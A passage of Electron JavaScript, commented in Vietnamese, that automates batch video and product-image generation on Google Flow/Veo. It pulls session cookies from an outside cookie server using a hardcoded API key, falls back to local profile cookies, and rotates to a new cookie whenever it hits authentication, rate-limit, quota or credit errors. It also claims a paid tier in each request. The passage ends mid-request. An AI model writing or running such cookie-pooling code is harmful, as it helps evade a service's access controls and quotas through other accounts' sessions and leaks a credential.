  const sendLog = (id, msg, status, videoUrl = null) => {
    if (($e || Qe) && status !== "idle" && status !== "finished") return;
    if (win && !win.isDestroyed()) {
      win.webContents.send("browser:log", {
        promptId: id,
        message: msg,
        status: status,
        videoUrl: videoUrl,
        operationName: "R2VGen",
        sceneId: `r2v-${Date.now()}`
      });
    }
  };

  // --- QUẢN LÝ COOKIE POOL (CHỮA LÀNH) ---
  const fetchNewCookieFromServer = async (reason = "") => {
    try {
      const fetchFn = global.fetch || require("node-fetch");
      const res = await (await fetchFn(kinxCookieUrl(reason), {
        headers: { "X-API-Key": "kinx@0$*2048", Authorization: `Bearer ${authToken}` },
      })).json();
      if (res.success && res.cookie) return res.cookie;
      throw new Error("Server không trả về cookie hợp lệ.");
    } catch (err) {
      throw new Error(`Lỗi lấy cookie: ${err.message}`);
    }
  };

  const initProjectForCookie = async (cookie, index) => {
    try {
      // Flow RPC: jHPbke (tạo project) + UpteDb (lấy UUID), cookie dùng chung từ kinxcookie.php
      const projectId = await flowCreateProject(authToken, flowDefaultProjectTitle(), cookie);
      if (!projectId) throw new Error("Không tạo được Project ID.");
      return projectId;
    } catch (err) {
      throw new Error(`Lỗi tạo Project: ${err.message}`);
    }
  };

  const prepareCookiePool = async () => {
    global.veoCookieCache = [];
    const requiredCookies = 1;
    const now = Date.now();

    let initAttempts = 0;
    while (global.veoCookieCache.length < requiredCookies) {
      if ($e || Qe) break;
      const idx = global.veoCookieCache.length + 1;
      sendLog(null, `[Init] Đang khởi tạo Cookie #${idx}/${requiredCookies}...`, "running");
      try {
        let newCookie;
        const hasActiveLocal = activeCookie && (typeof activeCookie === 'string' ? activeCookie.trim().length > 10 : activeCookie.value && activeCookie.value.trim().length > 10);
        try {
          newCookie = await fetchNewCookieFromServer(initAttempts > 0 ? "401" : "");
          sendLog(null, `[Init] Lấy Cookie từ Server thành công (Ưu tiên Server).`, "success");
        } catch (serverErr) {
          if (hasActiveLocal) {
            newCookie = activeCookie;
            sendLog(null, `[Init] Server không trả cookie, dùng Cookie Local dự phòng.`, "warning");
          } else {
            throw serverErr;
          }
        }
        const projectId = await initProjectForCookie(newCookie, idx);
        global.veoCookieCache.push({ cookie: newCookie, projectId: projectId, timestamp: Date.now(), id: `pool-r2v-${idx}-${Date.now()}` });
        initAttempts = 0;
      } catch (err) {
        initAttempts++;
        sendLog(null, `Lỗi khởi tạo Cookie #${idx}: ${err.message}. Đang thử lại (${initAttempts}/3)...`, "error");
        if (initAttempts >= 3) {
          sendLog(null, "ERROR: COOKIE_INIT", "failed");
          return false;
        }
        await cancellableSleep(2000);
      }
    }
    return global.veoCookieCache.length >= requiredCookies;
  };

  const refreshCookieInPool = async (poolIndex, reason = "") => {
    if ($e || Qe) return false;
    try {
      // 1. Ưu tiên lấy Cookie mới từ Server trước
      try {
        const newCookie = await fetchNewCookieFromServer(reason);
        if ($e || Qe) return false;
        const newProjectId = await initProjectForCookie(newCookie, poolIndex);
        if ($e || Qe) return false;
        const oldItem = global.veoCookieCache[poolIndex];
        if (oldItem) {
          oldItem.isRetired = true;
          if (!oldItem.activeTasks || oldItem.activeTasks <= 0) {
            oldItem.cookie = null;
            oldItem.projectId = null;
          } else {
            console.log(`[Cookie Pool] Cookie cũ còn ${oldItem.activeTasks} luồng đang chạy, khóa lại chờ luồng chạy xong rồi mới xóa.`);
          }
        }
        global.veoCookieCache[poolIndex] = { cookie: newCookie, projectId: newProjectId, timestamp: Date.now(), id: `pool-r2v-${poolIndex}-${Date.now()}`, activeTasks: 0 };
        sendLog(null, `[Refresh] Đã làm mới Cookie từ Server thành công!`, "success");
        return true;
      } catch (serverErr) {
        console.warn(`[R2V Refresh] Server không trả cookie: ${serverErr.message}`);
      }

      // 2. Server không trả cookie -> mới dùng sang localCookies Profile
      if (localCookies && Array.isArray(localCookies) && localCookies.length > 0) {
        let candidates = localCookies.filter((x) => x && (x.value || x.cookie) && !localConsumed.has(x.value || x.cookie));
        if (candidates.length === 0) {
          localConsumed = new Set();
          candidates = localCookies.filter((x) => x && (x.value || x.cookie));
        }
        const currentValue = global.veoCookieCache[poolIndex]?.cookie?.value || global.veoCookieCache[poolIndex]?.cookie;
        const notCurrent = candidates.filter((x) => (x.value || x.cookie) !== currentValue);
        if (notCurrent.length > 0) candidates = notCurrent;
        for (const lc of candidates) {
          if ($e || Qe) return false;
          try {
            const pid = await initProjectForCookie(lc, poolIndex);
            if ($e || Qe) return false;
            const oldItem = global.veoCookieCache[poolIndex];
            if (oldItem) {
              oldItem.isRetired = true;
              if (!oldItem.activeTasks || oldItem.activeTasks <= 0) {
                oldItem.cookie = null;
                oldItem.projectId = null;
              } else {
                console.log(`[Cookie Pool] Cookie cũ còn ${oldItem.activeTasks} luồng đang chạy, khóa lại chờ luồng chạy xong rồi mới xóa.`);
              }
            }
            global.veoCookieCache[poolIndex] = { cookie: lc, projectId: pid, timestamp: Date.now(), id: `pool-r2v-${poolIndex}-${Date.now()}`, activeTasks: 0 };
            const cVal = lc.value || lc.cookie;
            localConsumed.add(cVal);
            sendLog(null, `Server không có cookie, chuyển sang Profile local "${lc.name || 'Local'}"!`, "warning");
            return true;
          } catch (e) {
            localConsumed.add(lc.value || lc.cookie);
          }
        }
      }

      console.error("[R2V Refresh Cookie Error]: Server không trả cookie và không còn Profile Local khả dụng.");
      return false;
    } catch (err) {
      console.error("[R2V Refresh Cookie Error]:", err.message);
      return false;
    }
  };

  let cookiePoolReady = false;
  try {
    cookiePoolReady = await prepareCookiePool();
  } catch (e) {
    console.warn("Lỗi khởi tạo pool R2V:", e.message);
  }
  global.veoCookieCache = global.veoCookieCache || [];
  if (!cookiePoolReady || global.veoCookieCache.length === 0) {
    sendLog(null, "Đã dừng: Chưa có Cookie khả dụng từ Server hoặc Profile.", "idle");
    return;
  }

  // ============================================================

  sendLog(null, `Bắt đầu xử lý ${prompts.length} prompt (Studio Tạo Video)...`, "running");

  const queue = [...prompts];
  let activeWorkers = 0;
  let workerIdCounter = 0;

  const processPrompt = async (p, poolIndex) => {
    let attempt = 0;
    while (true) {
      if ($e || Qe) { sendLog(p.id, "Đã dừng.", "idle"); return; }
      attempt++;


      const safeIndex = poolIndex % (global.veoCookieCache.length || 1);
      let poolItem = global.veoCookieCache[safeIndex];

      if (!poolItem || !poolItem.cookie || !poolItem.projectId) {
        sendLog(p.id, `Đang kết nối lại (Luồng ${safeIndex})...`, "processing");
        await refreshCookieInPool(safeIndex);
        poolItem = global.veoCookieCache[safeIndex];
        if (!poolItem) {
          if (attempt >= 3) { sendLog(p.id, "ERROR: COOKIE", "failed"); return; }
          await cancellableSleep(5000); continue;
        }
      }

      try {
        if (attempt === 1 || attempt % 5 === 0) sendLog(p.id, "Đang xử lý...", "processing");

        const sessionBase = `;${Date.now()}`;
        let refMediaIds = [];
        const referenceImages = p.referenceImagesBase64 || p.referenceImages || [];
        if (!referenceImages || referenceImages.length === 0) {
          throw new Error("Thiếu dữ liệu ảnh tham chiếu (base64).");
        }

        const safeRefImages = referenceImages.slice(0, 3);

        for (let j = 0; j < safeRefImages.length; j++) {
          const base64Str = safeRefImages[j];
          const cacheKey = `${poolItem.projectId}_${_r.createHash('md5').update(base64Str).digest('hex')}`;

          if (global.uploadedImageCache.has(cacheKey)) {
            const cached = global.uploadedImageCache.get(cacheKey);
            if (typeof cached === "string") {
              sendLog(p.id, `Ảnh Studio ${j + 1}: Sẵn sàng (Cache) ⚡`, "submitting");
              refMediaIds.push(cached);
            } else {
              sendLog(p.id, `Ảnh Studio ${j + 1}: Chờ luồng khác tải... ⏳`, "submitting");
              const mId = await cached;
              if (!mId) throw new Error("Lỗi tải ảnh tham chiếu Studio.");
              refMediaIds.push(mId);
            }
          } else {
            sendLog(p.id, `Ảnh Studio ${j + 1}/${safeRefImages.length}: Đang tải lên... 📤`, "submitting");
            const uploadPromise = bo(win, base64Str, poolItem.cookie, p.id, poolItem.projectId, "browser:log");
            global.uploadedImageCache.set(cacheKey, uploadPromise);
            const mId = await uploadPromise;
            if (mId) {
              global.uploadedImageCache.set(cacheKey, mId);
              refMediaIds.push(mId);
            } else {
              global.uploadedImageCache.delete(cacheKey);
              throw new Error("Lỗi tải ảnh tham chiếu Studio.");
            }
          }
        }

        if (refMediaIds.length === 0) throw new Error("Tải ảnh tham chiếu thất bại.");

        sendLog(p.id, "Đang gửi lệnh tạo video với ảnh tham chiếu...", "processing");

        const isPortrait = aspectRatio === "PORTRAIT" || aspectRatio === "9:16";
        const aspectStr = isPortrait ? "portrait" : "landscape";
        const aspectEnum = isPortrait ? "PORTRAIT" : "LANDSCAPE";
        const modelKeyR2V = flowFormatModelKey("veo_3_1_r2v_lite");
        const sceneId = `uuid-${Date.now()}-${Math.random()}`;

        const requestPayload = {
          aspectRatio: `VIDEO_ASPECT_RATIO_${aspectEnum}`,
          seed: Math.floor(Math.random() * 1e5),
          textInput: { structuredPrompt: { parts: [{ text: p.text }] } },
          videoModelKey: modelKeyR2V,
          metadata: { sceneId: sceneId },
          referenceImages: refMediaIds.map(mId => ({
            mediaId: mId,
            imageUsageType: "IMAGE_USAGE_TYPE_ASSET"
          }))
        };

        const payload = {
          mediaGenerationContext: {
            batchId: `batch-${Date.now()}-${Math.random()}`,
            audioFailurePreference: "BLOCK_SILENCED_VIDEOS"
          },
          clientContext: {
            sessionId: sessionBase,
            projectId: poolItem.projectId,
            tool: "IMAGE_FX",
            userPaygateTier: "PAYGATE_TIER_TWO",
          },
          requests: [requestPayload],
          useV2ModelConfig: true
        };

        const genRes = await We(null, {
          // url: "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoReferenceImages",
          url: "https://flow.google.com/v1/video:batchAsyncGenerateVideoReferenceImages",
          cookie: poolItem.cookie,
          options: {
            method: "POST",
            headers: {},
            body: { ...payload, useV2ModelConfig: true },
          },
        });

        const workflow = genRes?.workflows?.[0];
        const media = genRes?.media?.[0];
        const opName = media?.name || workflow?.name || genRes?.media?.[0]?.operation?.name;
        const sId = media?.sceneId || genRes?.media?.[0]?.sceneId || genRes?.sceneId || sceneId;

        if (!opName) {
          console.error("[R2V] Lỗi khởi tạo:", JSON.stringify(genRes));
          let errDetail = genRes?.error?.message || genRes?.statusDetail || "Google từ chối lệnh tạo video (Có thể do Prompt hoặc ảnh vi phạm chính sách).";
          if (JSON.stringify(genRes).includes("SAFETY")) {
            errDetail = "Vi phạm bộ lọc an toàn của Google. Vui lòng kiểm tra lại Prompt và ảnh tham chiếu.";
          }
          throw new Error(`Lỗi khởi tạo: ${errDetail}`);
        }

        let isComplete = false;
        while (!isComplete && !($e || Qe)) {
          await cancellableSleep(40000);
          if ($e || Qe) return;
          if (!poolItem.projectId) throw new Error("Thiếu projectId thật cho kiểm tra video");
          const checkRes = await We(null, {
            // url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
            url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus",
            cookie: poolItem.cookie,
            options: {
              method: "POST",
              body: { media: [{ name: opName, projectId: poolItem.projectId }] }
            }
          });


          console.log("[Extended Video] checkRes:", JSON.stringify(checkRes).substring(0, 500));
          const opStatus = checkRes?.media?.[0] || checkRes?.media?.[0] || checkRes;

          if (!opStatus) continue;

          const statusStr = (opStatus.status || opStatus.mediaMetadata?.mediaStatus?.mediaGenerationStatus || "").toUpperCase();

          if (statusStr === "MEDIA_GENERATION_STATUS_SUCCESSFUL") {
            const vidMeta = opStatus.operation?.metadata?.video || opStatus.video || checkRes.video;
            let finalUrl = vidMeta?.fifeUrl || vidMeta?.servingBaseUri || vidMeta?.generatedVideo?.fifeUrl || vidMeta?.generatedVideo?.servingBaseUri;
            if (!finalUrl) {
              try {
                // Dynamically get mediaId from available variables (S, m, checkRes, etc)
                let mId = "";
                if (typeof opStatus !== 'undefined') mId = opStatus.operation?.name || opStatus.name;
                if (!mId && typeof checkRes !== 'undefined') mId = checkRes?.media?.[0]?.name;
                if (!mId && typeof S !== 'undefined') mId = S?.operation?.name || S?.name;
                if (!mId && typeof m !== 'undefined') mId = m?.operation?.name || m?.name;

                if (mId) {
                  const fetchFn = global.fetch || require("node-fetch");
                  // Find available cookie variable
                  let cVal = "";
                  if (typeof poolItem !== 'undefined' && poolItem && poolItem.cookie) cVal = poolItem.cookie;
                  else if (typeof cookie !== 'undefined') cVal = cookie;
                  else if (typeof c !== 'undefined') cVal = c;
                  else if (typeof h !== 'undefined') cVal = h;

                  if (typeof cVal === "object") cVal = cVal.value;


                  console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                  const redirectRes = await flowMediaRedirectResponse(mId, cVal);
                  if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                    finalUrl = redirectRes.headers.get("location");
                  } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                    finalUrl = redirectRes.url;
                  } else {
                    try {
                      const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
                      const signed = await fetchFlowMediaSignedUrl(mId, cValStr);
                      if (signed) { finalUrl = signed; console.log("[Redirect] as29s fallback lay URL:", signed); }
                    } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                  }
                }
              } catch (e) {
                console.error("Lỗi Redirect API:", e);
              }
            }

            if (finalUrl) {
              if (autoSaveConfig && autoSaveConfig.enabled && autoSaveConfig.path) {
                sendLog(p.id, `(${upscaleMode})...`, "downloading", finalUrl);
                await Ho(win, finalUrl, p.text, autoSaveConfig.path, p.originalIndex, { ...autoSaveConfig, isUpscale: upscaleMode !== 'original', upscaleResolution: upscaleMode }, p.id);
              }
              sendLog(p.id, "Tạo video hoàn tất!", "success", finalUrl);
              return; // HOÀN THÀNH
            }
          } else if (statusStr === "MEDIA_GENERATION_STATUS_FAILED") {
            const detail = opStatus.error?.message || opStatus.mediaStatus?.statusDetail || "Không có chi tiết lỗi từ Google";
            console.error(`[R2V ${p.id}] Chi tiết lỗi FAILED:`, JSON.stringify(opStatus));
            throw new Error(`Lỗi Veo API (FAILED): ${detail}`);
          }
        }
        if ($e || Qe) return;
      } catch (err) {
        if ($e || Qe || String(err.message || "").includes("SESSION_STOPPED")) return;
        const em0 = (err.message || "").toLowerCase();
        if (em0.includes("safety") || em0.includes("unsafe") || em0.includes("filtered") || em0.includes("vi phạm") || em0.includes("public_error_audio_filtered")) {
          sendLog(p.id, "Lỗi Vi phạm chính sách", "failed"); return;
        }

        console.error(`[R2V Error Prompt ${p.id}]:`, err.message);

        const errMsg = err.message.toLowerCase();
        let statusMsg = "Đang xử lý...";
        let waitTime = 3000;
        const shouldRotateCookie = errMsg.includes("401") || errMsg.includes("unauthenticated") || errMsg.includes("429") || errMsg.includes("rate limit") || errMsg.includes("quota") || errMsg.includes("resource_exhausted") || errMsg.includes("throttled") || errMsg.includes("credit") || errMsg.includes("tín dụng") || errMsg.includes("insufficient");

        if (errMsg.includes("401") || errMsg.includes("unauthenticated")) {
          statusMsg = "401: Lỗi xác thực (Auth)";
        } else if (errMsg.includes("403")) {
          statusMsg = "403: Flow web bị chặn, không đổi cookie";
        } else if (errMsg.includes("429") || errMsg.includes("rate limit") || errMsg.includes("quota") || errMsg.includes("resource_exhausted") || errMsg.includes("throttled")) {
          statusMsg = "429: Thao tác quá nhanh dừng và chờ 5 phút rồi thử lại";
          waitTime = 10000;
        } else if (errMsg.includes("mediaid") || errMsg.includes("upload")) {
          statusMsg = "Lỗi upload ảnh. Không đổi cookie, thử lại...";
        } else if (errMsg.includes("500") || errMsg.includes("timeout") || errMsg.includes("network")) {
          statusMsg = "500: Lỗi Server/Timeout, không đổi cookie";
        } else {
          statusMsg = `${err.statusCode || "Error"}. Không đổi cookie, thử lại...`;
        }

        sendLog(p.id, statusMsg, "processing");
        if (attempt >= 3) { sendLog(p.id, "ERROR: " + statusMsg.split(":")[0], "failed"); return; }
        if (shouldRotateCookie) await refreshCookieInPool(safeIndex, (errMsg.includes("401") || errMsg.includes("unauthenticated")) ? "401" : "429");
        await cancellableSleep(waitTime);
      }
    }
  };

  const runNext = () => {
    if ($e || Qe) { queue.length = 0; return; }
    if (queue.length === 0 && activeWorkers === 0) {
      sendLog(null, "===== Hoàn tất xử lý ảnh tham chiếu! =====", "finished");
      return;
    }
    while (queue.length > 0 && activeWorkers < (concurrentStreams || 1)) {
      const p = queue.shift();
      activeWorkers++;
      const assignedCookieIndex = workerIdCounter % (global.veoCookieCache.length || 1);
      workerIdCounter++;
      processPrompt(p, assignedCookieIndex).finally(() => {
        activeWorkers--;
        setTimeout(runNext, 500);
      });
    }
  };

  runNext();
});
// ==============================================================================
he.ipcMain.on("extended-video:stop", () => {
  console.log("Received stop extended video signal."), ($e = !0), (Qe = !0);
  uploadMutex = Promise.resolve();
  abortCurrentSession();
});

// --- AUTO PRODUCT MAKER ---
he.ipcMain.on("video:auto-product-maker", async (event, args) => {
  const products = args.products || [];
  const charBase64 = args.characterImageBase64;
  const prompts = args.prompts || [];
  const aspectRatio = args.aspectRatio || "PORTRAIT";
  const concurrentStreams = args.concurrentStreams || 1;
  const autoSaveConfig = args.autoSaveConfig || {};
  const authToken = args.authToken;
  let activeCookie = args.activeCookie;

  $e = false; Qe = false;
  newSessionAbortController();
  // ===== [BUGFIX-404] Xóa cache session cũ khi bắt đầu chạy =====
  if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
  threadTokenCache.clear();
  console.log("[BUGFIX-404] Đã xóa cache session cũ (uploadedImageCache, bananaFrontendUploadCache, threadTokenCache).");
  // =============================================================

  const sendLog = (id, msg, status, videoUrl = null, thumbnail = null) => {
    if (($e || Qe) && status !== "idle" && status !== "failed") return;
    he.BrowserWindow.getAllWindows().forEach((win) => {
      if (!win.isDestroyed()) {
        win.webContents.send("auto-product:log", {
          linkId: id, message: msg, status: status, videoUrl: videoUrl, thumbnail: thumbnail
        });
      }
    });
  };

  // --- QUẢN LÝ COOKIE POOL TỐI THƯỢNG ---
  const fetchNewCookieFromServer = async (reason = "") => {
    try {
      const fetchFn = global.fetch || require("node-fetch");
      const res = await (await fetchFn(kinxCookieUrl(reason), {
        headers: { "X-API-Key": "kinx@0$*2048", Authorization: `Bearer ${authToken}` },
      })).json();
      if (res.success && res.cookie) return res.cookie;
      throw new Error("Server không trả về cookie hợp lệ.");
    } catch (err) {
      throw new Error(`Lỗi lấy cookie: ${err.message}`);
    }
  };

  const initProjectsForCookie = async (cookie, index) => {
    // Một cookie dùng chung một project cho cả ảnh và video trong toàn phiên.
    let projectId = null;
    try {
      // Flow RPC: jHPbke (tạo project) + UpteDb (lấy UUID), cookie dùng chung từ kinxcookie.php
      projectId = await flowCreateProject(authToken, flowDefaultProjectTitle(), cookie);
    } catch (err) {
      console.warn(`[Init] Lỗi Flow RPC tạo project: ${err.message}`);
    }

    if (!projectId) {
      throw new Error("Flow RPC không trả projectId thật; dừng để tránh lỗi 404");
    }

    // Giữ alias cũ để không phá các call site đã build.
    return { imgProjectId: projectId, vidProjectId: projectId, projectId };
  };

  const prepareCookiePool = async () => {
    global.veoCookieCache = [];
    const requiredCookies = 1;
    const now = Date.now();
    let initAttempts = 0;

    while (global.veoCookieCache.length < requiredCookies) {
      if ($e || Qe) break;
      const idx = global.veoCookieCache.length + 1;
      sendLog(null, `[Init] Đang khởi tạo Cookie #${idx}/${requiredCookies}...`, "processing");
      try {
        // Ưu tiên Cookie Server trước. Không có thì dùng Cookie Local (Profile) dự phòng.
        let newCookie;
        const hasActiveLocal = activeCookie && (typeof activeCookie === 'string' ? activeCookie.trim().length > 10 : activeCookie.value && activeCookie.value.trim().length > 10);
        try {
          newCookie = await fetchNewCookieFromServer(initAttempts > 0 ? "401" : "");
          sendLog(null, `[Init] Lấy Cookie từ Server thành công (Ưu tiên Server).`, "success");
        } catch (serverErr) {
          if (hasActiveLocal) {
            newCookie = activeCookie;
            sendLog(null, `[Init] Server lỗi, dùng Cookie Local dự phòng.`, "warning");
          } else {
            throw serverErr;
          }
        }
        const { imgProjectId, vidProjectId, projectId } = await initProjectsForCookie(newCookie, idx);
        global.veoCookieCache.push({ cookie: newCookie, imgProjectId, vidProjectId, projectId, timestamp: Date.now(), id: `pool-prod-${idx}-${Date.now()}` });
        initAttempts = 0;
      } catch (err) {
        initAttempts++;
        sendLog(null, `Lỗi khởi tạo Cookie #${idx}: ${err.message}. Đang thử lại (${initAttempts}/3)...`, "error");
        if (initAttempts >= 3) {
          sendLog(null, "ERROR: COOKIE_INIT", "failed");
          return false;
        }
        await cancellableSleep(2000);
      }
    }
    return global.veoCookieCache.length >= requiredCookies;
  };

  const refreshCookieInPool = async (poolIndex, reason = "") => {
    try {
      const newCookie = await fetchNewCookieFromServer(reason);
      const { imgProjectId, vidProjectId, projectId } = await initProjectsForCookie(newCookie, poolIndex);
      global.veoCookieCache[poolIndex] = { cookie: newCookie, imgProjectId, vidProjectId, projectId, timestamp: Date.now(), id: `pool-prod-${poolIndex}-${Date.now()}` };
      return true;
    } catch (err) { return false; }
  }
    ;

  let cookiePoolReady = false;
  try {
    cookiePoolReady = await prepareCookiePool();
  } catch (e) {
    console.warn("Lỗi khởi tạo pool Prod:", e.message);
  }
  if (!cookiePoolReady && global.veoCookieCache.length === 0) {
    sendLog(null, "ERROR: COOKIE_INIT - Không tạo được projectId thật cho cookie.", "failed");
    return;
  }

  const tempDir = ye.join(he.app.getPath("temp"), `prod-maker-${Date.now()}`);
  if (!be.existsSync(tempDir)) await be.promises.mkdir(tempDir, { recursive: true });

  // TRUNG TÂM XỬ LÝ LỖI (Bao bọc TẤT CẢ các API con)
  const executeWithPool = async (linkId, logPrefix, statusFlag, poolIndex, actionFn) => {
    let attempts = 0;
    while (true) {
      if ($e || Qe) throw new Error("Đã dừng.");
      attempts++;

      const safeIndex = poolIndex % (global.veoCookieCache.length || 1);
      let poolItem = global.veoCookieCache[safeIndex];

      if (!poolItem || !poolItem.cookie) {
        await refreshCookieInPool(safeIndex);
        poolItem = global.veoCookieCache[safeIndex];
        if (!poolItem) { await cancellableSleep(5000); continue; }
      }

      try {
        return await actionFn(poolItem);
      } catch (err) {
        const em0 = (err.message || "").toLowerCase();
        if (em0.includes("safety") || em0.includes("unsafe") || em0.includes("filtered") || em0.includes("vi phạm") || em0.includes("public_error_audio_filtered")) {
          sendLog(linkId, "Lỗi Vi phạm chính sách", "failed"); throw new Error("Lỗi nội dung/Vi phạm chính sách");
        }

        const errMsg = (err.message || "").toLowerCase() + " " + String(err).toLowerCase();
        let waitTime = 3000;

        const shouldRotateCookie = errMsg.includes("401") || errMsg.includes("unauthenticated") || errMsg.includes("429") || errMsg.includes("quota") || errMsg.includes("resource_exhausted") || errMsg.includes("rate limit") || errMsg.includes("throttled") || errMsg.includes("credit") || errMsg.includes("tín dụng") || errMsg.includes("insufficient");
        if (shouldRotateCookie) {
          sendLog(linkId, `[${logPrefix}] Cookie/project lỗi xác thực hoặc quota, đang đổi và thử lại...`, statusFlag);
          await refreshCookieInPool(safeIndex, (errMsg.includes("401") || errMsg.includes("unauthenticated")) ? "401" : "429");
          if (errMsg.includes("429") || errMsg.includes("quota") || errMsg.includes("resource_exhausted") || errMsg.includes("rate limit") || errMsg.includes("throttled")) waitTime = 10000;
          if (attempts >= 3) throw new Error("ERROR: " + (err.message || "ERROR"));
          await cancellableSleep(waitTime);
        } else {
          if (attempts >= 3) throw new Error("ERROR: " + (err.statusCode || "ERROR"));
          await cancellableSleep(2000);
        }
      }
    }
  };

  global.autoProductCache = global.autoProductCache || new Map();
  const processProduct = async (prodItem, poolIndex) => {
    const prodId = prodItem.id;
    let cachedData = global.autoProductCache.get(prodId) || {
      currentLastFrameBase64: null,
      generatedVideoPaths: [],
      completedPromptIndexes: []
    };

    let currentLastFrameBase64 = cachedData.currentLastFrameBase64;
    let generatedVideoPaths = [...cachedData.generatedVideoPaths];
    let completedPromptIndexes = [...cachedData.completedPromptIndexes];

    try {
      const productImgBase64 = prodItem.base64;
      if (!productImgBase64) throw new Error("Lỗi: Không tìm thấy dữ liệu ảnh sản phẩm.");

      const sessionBase = `;${Date.now()}`;

      if (!currentLastFrameBase64) {
        sendLog(prodId, "B1: Ghép nhân vật & SP (Banana Pro)...", "drawing");

        // UP ẢNH NHÂN VẬT
        const charMediaId = await executeWithPool(prodId, "Up ảnh NV", "drawing", poolIndex, async (poolItem) => {
          const cacheKey = `${poolItem.imgProjectId}_${_r.createHash('md5').update(charBase64).digest('hex')}`;
          if (global.uploadedImageCache.has(cacheKey)) {
            const cached = global.uploadedImageCache.get(cacheKey);
            if (typeof cached === "string") return cached;
            return await cached;
          }
          const uploadPromise = bo(null, charBase64, poolItem.cookie, prodId, poolItem.imgProjectId, "auto-product:log");
          global.uploadedImageCache.set(cacheKey, uploadPromise);
          const mId = await uploadPromise;
          if (mId) global.uploadedImageCache.set(cacheKey, mId);
          else global.uploadedImageCache.delete(cacheKey);
          return mId;
        });

        sendLog(prodId, "Đang xử lý tải ảnh (tránh Google chặn)...", "drawing");
        await cancellableSleep(4000); // Nghỉ xả hơi

        // UP ẢNH SẢN PHẨM
        const prodMediaId = await executeWithPool(prodId, "Up ảnh SP", "drawing", poolIndex, async (poolItem) => {
          const cacheKey = `${poolItem.imgProjectId}_${_r.createHash('md5').update(productImgBase64).digest('hex')}`;
          if (global.uploadedImageCache.has(cacheKey)) {
            const cached = global.uploadedImageCache.get(cacheKey);
            if (typeof cached === "string") return cached;
            return await cached;
          }
          const uploadPromise = bo(null, productImgBase64, poolItem.cookie, prodId, poolItem.imgProjectId, "auto-product:log");
          global.uploadedImageCache.set(cacheKey, uploadPromise);
          const mId = await uploadPromise;
          if (mId) global.uploadedImageCache.set(cacheKey, mId);
          else global.uploadedImageCache.delete(cacheKey);
          return mId;
        });

        const designPrompt = "A high quality commercial product photography seamlessly blending the character and the product. Cinematic lighting, photorealistic, 8k resolution.";

        currentLastFrameBase64 = await executeWithPool(prodId, "Vẽ ảnh gốc", "drawing", poolIndex, async (poolItem) => {
          const getOrUploadForPool = async (b64Data) => {
            const cKey = `${poolItem.imgProjectId}_${_r.createHash('md5').update(b64Data).digest('hex')}`;
            if (global.uploadedImageCache.has(cKey)) {
              const cached = global.uploadedImageCache.get(cKey);
              return typeof cached === "string" ? cached : await cached;
            }
            const upProm = bo(null, b64Data, poolItem.cookie, prodId, poolItem.imgProjectId, "auto-product:log");
            global.uploadedImageCache.set(cKey, upProm);
            const mId = await upProm;
            if (mId) global.uploadedImageCache.set(cKey, mId);
            else global.uploadedImageCache.delete(cKey);
            return mId;
          };
          const curCharMediaId = await getOrUploadForPool(charBase64) || charMediaId;
          const curProdMediaId = await getOrUploadForPool(productImgBase64) || prodMediaId;

          const imgRes = await We(null, {
            // url: `https://aisandbox-pa.googleapis.com/v1/projects/${poolItem.imgProjectId}/flowMedia:batchGenerateImages`,
            url: `https://flow.google.com/v1/projects/${poolItem.imgProjectId}/flowMedia:batchGenerateImages`,
            cookie: poolItem.cookie,
            options: {
              method: "POST",
              body: {
                clientContext: { sessionId: sessionBase, projectId: poolItem.imgProjectId, tool: "IMAGE_FX", userPaygateTier: "PAYGATE_TIER_TWO" },
                requests: [{ seed: Math.floor(Math.random() * 1e6), imageModelName: "GEM_PIX_2", imageAspectRatio: `IMAGE_ASPECT_RATIO_${aspectRatio}`, prompt: designPrompt, imageInputs: [{ name: curCharMediaId, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" }, { name: curProdMediaId, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" }] }]
              }
            }
          });

          let b64 = imgRes?.media?.[0]?.image?.generatedImage?.encodedImage;
          if (!b64) b64 = imgRes?.media?.[0]?.image?.encodedImage;

          if (!b64) {
            const fifeUrl = imgRes?.media?.[0]?.image?.generatedImage?.fifeUrl || imgRes?.media?.[0]?.image?.fifeUrl;
            if (fifeUrl) {
              const fetchFn = global.fetch || require("node-fetch");
              const imgFetch = await fetchFn(fifeUrl);
              const imgBuffer = await imgFetch.arrayBuffer();
              b64 = Buffer.from(imgBuffer).toString('base64');
            }
          }

          if (!b64) throw new Error("Lỗi API không trả về ảnh Base64 hoặc URL: " + JSON.stringify(imgRes));
          return b64;
        });

        sendLog(prodId, "Vẽ ảnh gốc thành công!", "drawing", null, `data:image/png;base64,${currentLastFrameBase64}`);
        cachedData.currentLastFrameBase64 = currentLastFrameBase64;
        global.autoProductCache.set(prodId, cachedData);
      } else {
        sendLog(prodId, "Bỏ qua tạo ảnh, đang sử dụng lại ảnh cũ...", "drawing", null, `data:image/png;base64,${currentLastFrameBase64}`);
      }

      const veoModelKey = flowFormatModelKey("veo_3_1_i2v_lite");

      for (let pIdx = 0; pIdx < prompts.length; pIdx++) {
        if ($e || Qe) throw new Error("Đã dừng.");
        if (completedPromptIndexes.includes(pIdx)) {
          sendLog(prodId, `Bỏ qua Video ${pIdx + 1}/${prompts.length} vì đã tạo xong trước đó.`, "video");
          continue;
        }
        sendLog(prodId, `B2: Đang tạo Video ${pIdx + 1}/${prompts.length}...`, "video");

        const frameMediaId = await executeWithPool(prodId, "Up Frame", "video", poolIndex, (poolItem) =>
          bo(null, currentLastFrameBase64, poolItem.cookie, prodId, poolItem.vidProjectId || poolItem.projectId, "auto-product:log")
        );
        const sceneId = `uuid-${Date.now()}-${Math.random()}`;

        const opName = await executeWithPool(prodId, "Lệnh Video", "video", poolIndex, async (poolItem) => {
          const payload = {
            mediaGenerationContext: {
              batchId: `batch-${Date.now()}-${Math.random()}`,
              audioFailurePreference: "BLOCK_SILENCED_VIDEOS"
            },
            clientContext: {
              sessionId: sessionBase,
              projectId: poolItem.vidProjectId,
              tool: "IMAGE_FX",
              userPaygateTier: "PAYGATE_TIER_TWO"
            },
